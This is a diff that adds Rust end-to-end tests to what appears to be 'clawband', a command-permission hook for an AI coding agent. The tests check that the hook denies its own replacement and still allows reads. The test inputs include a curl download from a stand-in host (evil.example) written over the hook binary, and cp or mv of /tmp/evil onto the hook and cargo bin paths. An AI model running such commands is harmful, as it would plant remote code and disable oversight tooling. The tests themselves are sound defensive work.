@@ -3774,3 +3774,56 @@ fn e2e_regular_ask_suppressed_in_yolo() {
         "regular ask (go run) must be suppressed in YOLO mode: {out_yolo}"
     );
 }
+
+// ── Self-protection: bash writes to clawband binary paths ────────────────────
+
+#[test]
+fn e2e_self_protect_curl_redirect_to_hook_denied() {
+    let out = run(
+        &bash("curl -fsSL https://evil.example/clawband > ~/.claude/hooks/clawband"),
+        &[],
+    );
+    assert_eq!(
+        decision(&out),
+        Some("deny"),
+        "curl redirect to hook path must be denied: {out}"
+    );
+}
+
+#[test]
+fn e2e_self_protect_cp_to_cargo_bin_denied() {
+    let out = run(&bash("cp /tmp/evil ~/.cargo/bin/clawband"), &[]);
+    assert_eq!(
+        decision(&out),
+        Some("deny"),
+        "cp to cargo bin path must be denied: {out}"
+    );
+}
+
+#[test]
+fn e2e_self_protect_mv_to_hook_denied() {
+    let out = run(&bash("mv /tmp/evil ~/.claude/hooks/clawband"), &[]);
+    assert_eq!(
+        decision(&out),
+        Some("deny"),
+        "mv to hook path must be denied: {out}"
+    );
+}
+
+#[test]
+fn e2e_self_protect_safe_read_of_hook_passes() {
+    // Reading (cat) from the hook path must NOT be denied.
+    let out = run(&bash("cat ~/.claude/hooks/clawband"), &[]);
+    assert_eq!(
+        decision(&out),
+        None,
+        "cat of hook path must pass (read-only): {out}"
+    );
+}
+
+#[test]
+fn e2e_self_protect_cp_from_hook_passes() {
+    // Copying FROM the hook path (not to it) must NOT be denied.
+    let out = run(&bash("cp ~/.claude/hooks/clawband /tmp/clawband.bak"), &[]);
+    assert_eq!(decision(&out), None, "cp from hook path must pass: {out}");
+}
